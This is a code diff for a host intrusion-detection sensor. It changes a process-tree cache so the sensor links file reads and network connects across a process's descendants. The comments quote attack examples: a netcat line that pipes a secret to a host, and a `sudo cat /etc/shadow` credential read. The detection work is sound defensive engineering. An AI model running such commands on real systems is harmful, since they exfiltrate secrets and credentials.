@@ -10,35 +10,49 @@ import (
 // Process-tree evidence (feature schema v4, plan item B2/B5).
 //
 // The attack-lab corpora show the file read and the network connect of one
-// attack are usually done by DIFFERENT processes (a reader and a connector,
-// e.g. `sh -c "cat secret | nc host"`), so a per-process score never holds
-// both. treeCache keeps the latest dim_file / dim_network per process and
-// aggregates them over the "family" of a process: its parent and all
-// children of that parent (itself and its siblings), as seen by kbd.
+// attack are usually done by DIFFERENT processes (for example a python
+// process runs `sudo cat /etc/shadow` as a child and then makes the connect
+// itself), so a per-process score never holds both. treeCache keeps, per
+// process, the highest file and network dimension scores it has ever shown
+// and aggregates them up the tree: a process's tree_* values are the maximum
+// over its own subtree (itself and all descendants kbd has seen).
 //
-// Design choices, all deliberately conservative:
-//   - Scope is one level up and across, not the whole ancestry. Walking to
-//     the top would merge everything under systemd/sshd/containerd and make
-//     the feature constant. A parent of PID 0 or 1 (or one kbd has never
-//     seen) gives a family of just the process itself.
+// Rules, each of which fixed a real defect found by replaying the lab
+// corpora (scripts/attack-lab/build_training_table.py):
+//   - Evidence only goes up. The sensor's dimension scores are the score of
+//     the LAST event, and the final process_state a process sends as it exits
+//     has them zeroed, so "latest value" erased a short-lived reader's
+//     evidence exactly when it exited.
+//   - A ppid of 0 means "unknown" (that same exit snapshot), not "re-parented":
+//     the previous parent is kept. Treating it as re-parenting detached the
+//     reader from its parent.
+//   - Descendants feed ancestors, not siblings. An earlier parent-plus-siblings
+//     scope caught 16 of 110 attack executions; the subtree catches the
+//     intended families.
+//
+// Other choices:
+//   - The walk is bounded (treeMaxDepth levels, treeMaxVisit nodes) so a
+//     process with thousands of descendants costs O(1) per update; beyond the
+//     bound the value is a lower bound.
 //   - PIDs are host-namespace tgids (kbd_sensor.bpf.c uses
 //     bpf_get_current_pid_tgid and real_parent->tgid), so a container's init
 //     is NOT pid 1 here and is treated like any other parent.
-//   - An exited process keeps contributing for treeExitedTTL: the reader is
-//     often gone before the connector starts.
+//   - An exited process keeps contributing for treeExitedTTL, a running one
+//     for treeStaleTTL since its last update.
 //   - PID reuse is guarded by StartTimeNs.
-//   - The ppid is the one the sensor recorded; a child re-parented after its
-//     parent died (to init or a subreaper) falls out of the original family.
+//   - Known hazard: a long-lived parent whose descendants collectively read
+//     sensitive files and connect (a supervisor, sshd, cron, or the attack-lab
+//     runner itself) will look like "both" indefinitely. In the lab corpora one
+//     such process produced most flagged background rows. This is a feature,
+//     not a verdict: nothing enforces on it.
 //   - Memory is bounded by treeMaxNodes; this is a cache, not persisted.
 const (
 	treeExitedTTL = 120 * time.Second
 	treeStaleTTL  = 10 * time.Minute
 	treeMaxNodes  = 65536
-	// treeMaxFamily bounds the siblings examined per update so a parent
-	// with thousands of children (a forking server, a build) costs O(1),
-	// not O(children), on every process_state. Beyond it the sibling sample
-	// is arbitrary (map order), so tree_* is a lower bound for such parents.
-	treeMaxFamily = 256
+	// treeMaxVisit and treeMaxDepth bound the descendant walk per update.
+	treeMaxVisit = 256
+	treeMaxDepth = 6
 )
 
 // Indices into ProcessStateMsg.DimScore, matching ipc.DimNames
@@ -93,10 +107,10 @@ func (t *treeCache) prune(now time.Time) {
 	}
 }
 
-// Update records the latest scores for a process and returns its family
-// aggregates: the highest file and network dimension scores across the
-// family, and the lower of the two (high only when BOTH kinds of evidence
-// exist somewhere in the family).
+// Update records a process's scores and returns its subtree aggregates: the
+// highest file and network dimension scores across the process and its
+// descendants, and the lower of the two (high only when BOTH kinds of
+// evidence exist somewhere in the subtree).
 func (t *treeCache) Update(msg *ipc.ProcessStateMsg) (file, net, both float64) {
 	t.mu.Lock()
 	defer t.mu.Unlock()
@@ -110,61 +124,67 @@ func (t *treeCache) Update(msg *ipc.ProcessStateMsg) (file, net, both float64) {
 			}
 		}
 	}
+	ppid := msg.PPID
 	n, ok := t.nodes[msg.PID]
 	if ok && n.start != msg.StartTimeNs && n.start != 0 && msg.StartTimeNs != 0 {
 		t.drop(msg.PID) // PID reused by a different process
 		ok = false
 	}
+	if ok && ppid == 0 {
+		ppid = n.ppid // 0 = unknown (exit snapshot), keep the parent
+	}
 	if !ok {
 		n = &treeNode{}
 		t.nodes[msg.PID] = n
-	} else if n.ppid != msg.PPID {
+	} else if n.ppid != ppid {
 		t.unlink(msg.PID, n)
 	}
-	n.ppid, n.start = msg.PPID, msg.StartTimeNs
-	n.file, n.net = msg.DimScore[dimFileIdx], msg.DimScore[dimNetworkIdx]
+	n.ppid, n.start = ppid, msg.StartTimeNs
+	n.file = maxf(n.file, msg.DimScore[dimFileIdx]) // evidence only goes up
+	n.net = maxf(n.net, msg.DimScore[dimNetworkIdx])
 	n.seen, n.exitedAt = now, time.Time{}
-	if msg.PPID > 1 {
-		c := t.children[msg.PPID]
+	if ppid > 1 {
+		c := t.children[ppid]
 		if c == nil {
 			c = map[uint32]struct{}{}
-			t.children[msg.PPID] = c
+			t.children[ppid] = c
 		}
 		c[msg.PID] = struct{}{}
 	}
-	return t.aggregate(msg.PID, n, now)
+	return t.aggregate(msg.PID, now)
 }
 
-func (t *treeCache) aggregate(pid uint32, self *treeNode, now time.Time) (file, net, both float64) {
-	file, net = self.file, self.net
-	take := func(m *treeNode) {
-		if !m.exitedAt.IsZero() && now.Sub(m.exitedAt) > treeExitedTTL {
-			return
-		}
-		if m.file > file {
-			file = m.file
-		}
-		if m.net > net {
-			net = m.net
-		}
+func (t *treeCache) aggregate(root uint32, now time.Time) (file, net, both float64) {
+	type item struct {
+		pid   uint32
+		depth int
 	}
-	if self.ppid > 1 {
-		if p, ok := t.nodes[self.ppid]; ok {
-			take(p)
+	stack := []item{{root, 0}}
+	visited := 0
+	for len(stack) > 0 && visited < treeMaxVisit {
+		it := stack[len(stack)-1]
+		stack = stack[:len(stack)-1]
+		visited++
+		if m, ok := t.nodes[it.pid]; ok && t.live(m, now) {
+			file, net = maxf(file, m.file), maxf(net, m.net)
 		}
-		scanned := 0
-		for sib := range t.children[self.ppid] {
-			if scanned++; scanned > treeMaxFamily {
-				break
-			}
-			if sib != pid {
-				if m, ok := t.nodes[sib]; ok {
-					take(m)
-				}
+		if it.depth < treeMaxDepth {
+			for c := range t.children[it.pid] {
+				stack = append(stack, item{c, it.depth + 1})
 			}
 		}
 	}
 	return file, net, minf(file, net)
+}
+
+// live reports whether a node still contributes: an exited process for
+// treeExitedTTL after its exit, a running one for treeStaleTTL after its last
+// update.
+func (t *treeCache) live(m *treeNode, now time.Time) bool {
+	if !m.exitedAt.IsZero() {
+		return now.Sub(m.exitedAt) <= treeExitedTTL
+	}
+	return now.Sub(m.seen) <= treeStaleTTL
 }
 
 // Exit marks a process as gone; its scores keep counting for treeExitedTTL.
@@ -174,6 +194,13 @@ func (t *treeCache) Exit(pid uint32) {
 	if n, ok := t.nodes[pid]; ok {
 		n.exitedAt = t.now()
 	}
+}
+
+func maxf(a, b float64) float64 {
+	if a > b {
+		return a
+	}
+	return b
 }
 
 func minf(a, b float64) float64 {
